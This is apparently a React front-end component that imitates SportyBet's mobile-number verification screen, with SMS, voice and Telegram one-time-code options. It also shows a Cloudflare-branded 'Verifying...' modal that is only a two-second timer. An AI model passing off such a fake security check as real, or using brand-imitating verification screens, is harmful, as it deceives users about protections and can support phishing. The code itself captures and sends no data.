import React, { useState } from 'react';
import { ChevronLeft, MessageSquare, Phone } from 'lucide-react';


const CloudflareModal = ({ isOpen }) => {
  if (!isOpen) return null;

  return (
    <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-60 p-4">
      <div className="bg-white rounded-lg p-6 max-w-sm w-full">
        <div className="flex items-center gap-3 mb-4">
          <div className="flex items-center gap-1">
            <div className="w-2 h-2 bg-green-500 rounded-full"></div>
            <div className="w-2 h-2 bg-blue-500 rounded-full"></div>
            <div className="w-2 h-2 bg-red-500 rounded-full"></div>
            <div className="w-2 h-2 bg-yellow-500 rounded-full"></div>
          </div>
          <span className="font-medium text-gray-900">Verifying...</span>
          <div className="ml-auto">
            <div className="text-orange-500 font-bold text-lg">CLOUDFLARE</div>
          </div>
        </div>
        <div className="text-xs text-gray-500 text-center">
          <span className="text-blue-500 underline">Privacy</span> • <span className="text-blue-500 underline">Terms</span>
        </div>
      </div>
    </div>
  );
};

const VerifyMobileNumber = ({ onBack, onSelectMethod }) => {
  const [showCloudflare, setShowCloudflare] = useState(false);

  const handleMethodSelect = (method) => {
    setShowCloudflare(true);
    
    // Simulate verification delay
    setTimeout(() => {
      setShowCloudflare(false);
      onSelectMethod(method);
    }, 2000);
  };

  return (
    <>
      <div className="fixed inset-0 bg-white z-50 flex flex-col">
        {/* Header */}
        <div className="flex items-center p-4 border-b">
          <button onClick={onBack} className="p-1 mr-3" title="Go back">
            <ChevronLeft className="w-6 h-6 text-gray-700" />
          </button>
        </div>

        {/* Content */}
        <div className="flex-1 flex flex-col items-center justify-center px-6">
          <div className="max-w-md mx-auto w-full text-center">
            {/* Security Icon */}
            <div className="mb-8">
              <div className="relative mx-auto w-32 h-40">
                {/* Phone outline */}
                <div className="absolute inset-0 bg-gray-200 rounded-2xl border-4 border-gray-300"></div>
                {/* Screen */}
                <div className="absolute top-4 left-4 right-4 bottom-8 bg-white rounded-lg"></div>
                {/* Shield */}
                <div className="absolute top-1/2 left-1/2 transform -translate-x-1/2 -translate-y-1/2">
                  <div className="w-12 h-14 bg-green-500 rounded-t-full rounded-b-sm relative">
                    <div className="absolute inset-1 bg-green-600 rounded-t-full rounded-b-sm"></div>
                    <div className="absolute top-2 left-1/2 transform -translate-x-1/2 w-2 h-2 bg-white rounded-full"></div>
                    <div className="absolute bottom-2 left-1/2 transform -translate-x-1/2 w-4 h-1 bg-white rounded"></div>
                  </div>
                </div>
                {/* Hand silhouettes */}
                <div className="absolute -left-8 bottom-0 w-16 h-20 bg-gray-300 rounded-full opacity-50 transform rotate-12"></div>
                <div className="absolute -right-8 bottom-0 w-16 h-20 bg-gray-300 rounded-full opacity-50 transform -rotate-12"></div>
              </div>
            </div>

            <h1 className="text-2xl font-semibold text-gray-900 mb-4">Verify Mobile Number</h1>
            <p className="text-gray-600 text-sm mb-8 leading-relaxed">
              Please select how you'd like to receive your 6-digit code
            </p>

            {/* OTP Methods */}
            <div className="space-y-4">
              {/* SMS OTP */}
              <button
                onClick={() => handleMethodSelect('sms')}
                className="w-full flex items-center justify-between p-4 border border-gray-200 rounded-lg hover:bg-gray-50 transition-colors"
              >
                <div className="flex items-center gap-3">
                  <MessageSquare className="w-6 h-6 text-gray-600" />
                  <span className="text-gray-900 font-medium">SMS OTP</span>
                </div>
                <div className="text-gray-400">›</div>
              </button>

              {/* Voice OTP */}
              <button
                onClick={() => handleMethodSelect('voice')}
                className="w-full flex items-center justify-between p-4 border border-gray-200 rounded-lg hover:bg-gray-50 transition-colors"
              >
                <div className="flex items-center gap-3">
                  <Phone className="w-6 h-6 text-gray-600" />
                  <span className="text-gray-900 font-medium">Voice OTP</span>
                </div>
                <div className="text-gray-400">›</div>
              </button>

              {/* Telegram OTP */}
              <button
                onClick={() => handleMethodSelect('telegram')}
                className="w-full flex items-center justify-between p-4 border border-gray-200 rounded-lg hover:bg-gray-50 transition-colors relative"
              >
                <div className="flex items-center gap-3">
                  <div className="w-6 h-6 bg-blue-500 rounded-full flex items-center justify-center">
                    <div className="w-4 h-4 bg-white rounded-full"></div>
                  </div>
                  <div className="text-left">
                    <div className="text-gray-900 font-medium">Telegram OTP</div>
                    <div className="text-xs text-gray-500">Telegram account must match the phone number registered with SportyBet</div>
                  </div>
                </div>
                <div className="flex items-center gap-2">
                  <span className="bg-green-100 text-green-700 text-xs px-2 py-1 rounded-full font-medium">Reliable</span>
                  <div className="text-gray-400">›</div>
                </div>
              </button>
            </div>
          </div>
        </div>

        {/* Bottom spacing */}
        <div className="h-20"></div>
      </div>

      {/* Cloudflare Modal */}
      <CloudflareModal isOpen={showCloudflare} onClose={() => setShowCloudflare(false)} />
    </>
  );
};

export default VerifyMobileNumber;
